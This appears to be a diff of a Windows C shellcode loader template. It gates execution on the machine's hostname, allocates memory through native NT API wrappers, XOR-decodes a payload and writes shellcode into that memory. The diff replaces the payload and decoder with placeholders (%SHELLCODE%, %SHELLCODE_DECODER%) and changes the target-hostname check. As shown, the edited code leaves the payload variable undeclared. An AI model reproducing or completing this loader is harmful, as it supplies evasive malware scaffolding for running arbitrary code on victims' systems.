@@ -1,6 +1,7 @@
 #include "definitions.h"
 
 
+
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
 
     char path[MAX_PATH]; 
@@ -37,7 +38,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     }
 
     const char* hostname = get_hostname(hKernel32dll);
-    if (key > 0 && is_target_hostname(hostname)) {
+    if (key > 0 && strcmp(hostname,"MYDOMAIN") != 0) {
         fprintf(file, "You have a key, which is : %s\n", hostname);
     } else {
         fprintf(file, "You don't have a key, try this one : %s\n", hostname);
@@ -48,7 +49,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     fclose(file);
 
 
-    unsigned char payload[] = "%SHELLCODE%";
+    
     
 
     SIZE_T regionSize = sizeof(payload);
@@ -67,7 +68,7 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
     // Allocating executable memory
     _NtAlocVirtMem((HANDLE)-1, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    XOR(payload,sizeof(payload),key);
+    %SHELLCODE_DECODER%
 
     // Copy shellcode into allocated memory
     _NtWriteVirtMem((HANDLE)-1, exec, payload, sizeof(payload), NULL);
